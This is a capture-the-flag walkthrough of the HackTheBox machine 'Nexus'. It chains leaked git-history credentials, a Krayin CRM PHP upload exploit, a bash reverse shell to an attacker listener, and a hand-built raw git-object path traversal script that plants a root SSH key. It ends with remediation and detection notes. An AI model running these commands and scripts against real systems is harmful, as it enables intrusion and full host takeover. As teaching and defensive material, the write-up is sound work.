# HackTheBox — Nexus

> **OS:** Linux (Ubuntu 24.04)  ·  **Difficulty:** Easy  ·  **Date:** 2026-08-19

**Kill chain:** `vhost discovery → public Gitea repo leaks DB creds in git history → Krayin CRM login (cred reuse) → CVE-2026-38526 PHP upload RCE → SSH as jones (live .env cred reuse) → Gitea template sync git tree path traversal → root SSH key injection → root`

---

## Overview

Nexus is a credential-reuse chain that ends in a genuinely non-obvious git internals attack.

You find credentials in a public Gitea repo's history, use them to get into a CRM, exploit an unrestricted PHP upload for RCE, find better credentials in the live config, and SSH in. From there, a systemd timer runs a Python script as root every minute — and the script reads file paths from git tree entries without sanitizing directory traversal sequences. By crafting raw git objects that bypass git's own path validation, you can write any file anywhere root can write. You use that to drop your SSH key into root's authorized_keys.

The privesc isn't hard once you understand it. The hard part is knowing that git tree objects are just binary blobs you can construct manually, and that `os.path.join()` resolves `..` at the OS level even when git's API would reject those paths.

---

## Recon

```bash
nmap -sV -sC -p- 10.129.234.54
```

```
22/tcp  OpenSSH 9.6p1 (Ubuntu)
80/tcp  nginx 1.24.0 — redirects to http://nexus.htb/
```

Add to hosts, browse the site. It's a static marketing page for "Nexus Energy Authority". The careers section has a job posting for Operations Specialist — Customer Platforms, and two emails: `careers@nexus.htb` and `j.matthew@nexus.htb` (the hiring manager). The job mentions Salesforce, HubSpot — hints at internal CRM tooling.

Vhost enumeration:

```bash
ffuf -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" \
  -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fw 4
```

Two subdomains: `git.nexus.htb` (Gitea) and `billing.nexus.htb` (Krayin CRM).

---

## Foothold — git history credential leak

Gitea has a public repo: `admin/krayin-docker-setup`. The current `.env` has a blank DB password, but the **git history** tells a different story — an earlier commit has:

```
DB_PASSWORD=N27xh!!2ucY04
```

Try that password against `billing.nexus.htb` with the hiring manager's email:

```
j.matthew@nexus.htb : N27xh!!2ucY04  →  Krayin CRM login ✓
```

Password reuse: the old DB password is also the CRM user's password.

---

## RCE — CVE-2026-38526 (Krayin CRM PHP upload)

The Krayin CRM version is 2.2.0, vulnerable to an unrestricted file upload via the TinyMCE endpoint. The PoC: upload a PHP webshell disguised as an image, content-type spoofed to `image/jpeg`, extension `.php`. The file lands in `/storage/tinymce/` which is web-accessible.

```bash
python3 exploit.py -t http://billing.nexus.htb \
  -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -c id
# uid=33(www-data)
```

Get a reverse shell:

```bash
# listener
nc -lvnp 4444

# exploit
python3 exploit.py -t http://billing.nexus.htb \
  -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' \
  -c 'bash -c "bash -i >& /dev/tcp/<LIP>/4444 0>&1"'
```

Stabilize:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lateral movement — www-data → jones

The live `.env` at `/var/www/krayin/.env` has a different (current) DB password:

```
DB_PASSWORD=y27xb3ha!!74GbR
```

`/etc/passwd` shows a system user `jones` — not `j.matthew`, not anything obvious. Try SSH:

```bash
ssh jones@10.129.234.54   # password: y27xb3ha!!74GbR  ✓
```

The live DB password is reused as jones's SSH password. User flag at `/home/jones/user.txt`.

---

## Privilege Escalation — Gitea template sync git tree traversal

Local enumeration finds a systemd timer:

```
gitea-template-sync.timer  → runs gitea-template-sync.service every 1 minute
```

The service runs `/usr/bin/python3 /etc/gitea/template-sync.py` as **root**. Reading the script:

- It reads a Gitea API token from `/etc/gitea/template-sync.conf`
- It fetches all repos marked as templates via the Gitea API
- For each template repo, it runs `git ls-tree -r HEAD` on the bare repo
- It extracts each file path from the tree output and writes the file content to `/home/git/template-staging/<owner>/<repo>/<filepath>`

The critical line:

```python
target = os.path.join(stage_path, filepath)
```

`filepath` comes directly from `git ls-tree` — the raw git tree path — with no sanitization. `os.path.join()` resolves `..` sequences at the OS level when the path is used to open a file. So if a tree entry has path `../../../../../root/.ssh/authorized_keys`, root will write your content there.

The problem: you can't use git's normal API to create files with `..` in the path — `git mktree` and `git add` reject them with "path contains slash" or similar validation. The bypass: write raw git object files directly to `.git/objects/`, bypassing git's `verify_path()` check entirely.

**Attack:**

Generate an SSH key on the box:
```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

Get a Gitea API token via the web UI (Settings → Applications, all permissions). Create a template repo:

```bash
TOKEN="<your_token>"
curl -s -X POST http://localhost:3000/api/v1/user/repos \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"rce","private":false,"auto_init":false}'

curl -s -X PATCH http://localhost:3000/api/v1/repos/jones/rce \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"template":true,"default_branch":"main"}'

git clone http://jones:'y27xb3ha!!74GbR'@localhost:3000/jones/rce.git /tmp/rce
cd /tmp/rce
```

Build the malicious git tree using a Python script that writes raw objects directly into `.git/objects/`:

```python
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time
def write_obj(data,t):
    h=("%s %d"%(t,len(data))).encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
    return sha
def entry(mode,name,sha):
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
key=r.stdout.strip()+"\n"
blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
```

The tree structure: `.. → .. → .. → .. → .. → root → .ssh → authorized_keys`. Five levels of `..` to escape `/home/git/template-staging/jones/rce/` and reach the filesystem root, then `root/.ssh/authorized_keys`.

```bash
python3 /tmp/build.py
git push origin main
```

Wait up to 1 minute for the timer. When the log shows `synced: ../../../../../root/.ssh/authorized_keys`, SSH in:

```bash
ssh -i /tmp/.k root@localhost
cat /root/root.txt
```

Root.

---

## Remediation

| Finding | Severity | Fix |
|---------|----------|-----|
| Credentials committed to git history | **Critical** | Rotate the exposed credential immediately. Use `git filter-repo` to scrub secrets from history. Enforce pre-commit hooks (gitleaks, trufflehog) to block secrets at commit time. |
| Password reuse across DB, CRM, and SSH | **Critical** | Unique credential per service and account. A DB password should never be reusable as a shell account password. |
| CVE-2026-38526 — Krayin CRM unrestricted file upload | **Critical** | Patch Krayin to ≥ 2.2.1. Validate file types server-side (not content-type, which is attacker-controlled). Store uploads outside web root. |
| Public Gitea repo exposing internal tooling config | High | Internal tool repos should be private. Never commit `.env` files. |
| `template-sync.py` uses `os.path.join()` on unsanitized git tree paths | **Critical** | Validate/canonicalize each path before use: `os.path.realpath(target).startswith(stage_path)`. Reject any path that escapes the staging directory. |

---

## Detection notes (blue-team view)

- **Git history secrets are forever.** The cred was "deleted" from the repo but lived in history. Tools like TruffleHog and Gitleaks scan git history, not just current content — deploy them in CI and on any newly-cloned internal repo.
- **The PHP upload RCE is loud.** A POST to `/admin/tinymce/upload` that results in a `.php` file in the web-accessible `/storage/tinymce/` path, followed immediately by a GET to that file, is a textbook webshell drop. Web application firewall rules on file upload endpoints (reject `.php` uploads) and alerting on process spawns from `nginx`/`php-fpm` (webserver processes shouldn't spawn `bash`) catch this.
- **The traversal attack is visible in the sync log.** The log at `/var/log/template-sync.log` recorded `synced: ../../../../../root/.ssh/authorized_keys` — a monitoring rule on that file for entries containing `..` in the synced path is trivially detectable and high-signal.
- **Root SSH login after authorized_keys modification.** Correlating a new write to `/root/.ssh/authorized_keys` with a subsequent successful root SSH auth is a clean two-event detection chain. FIM (file integrity monitoring) on `/root/.ssh/` combined with SSH auth log correlation catches this pattern in seconds.

---

## Lessons

- **Check every git commit, not just HEAD.** Secrets deleted from the current branch still live in history. `git log -p` or the Gitea commit browser finds them.
- **`os.path.join()` resolves `..` — always canonicalize before filesystem writes.** The fix is one line: check that `os.path.realpath(target)` starts with the expected base directory. Skipping this in a root-running script is the whole vulnerability.
- **Git's validation can be bypassed by writing raw objects.** `git mktree`, `git add`, and `git commit` call `verify_path()` which rejects traversal sequences. Writing directly to `.git/objects/` skips that. Any tool that reads git trees and uses the paths directly on the filesystem is vulnerable.
- **Password reuse kills chains.** This box's whole path was held together by one password reused in three places: git history DB cred → CRM login → SSH. Each reuse extended the attacker's reach by one more layer.
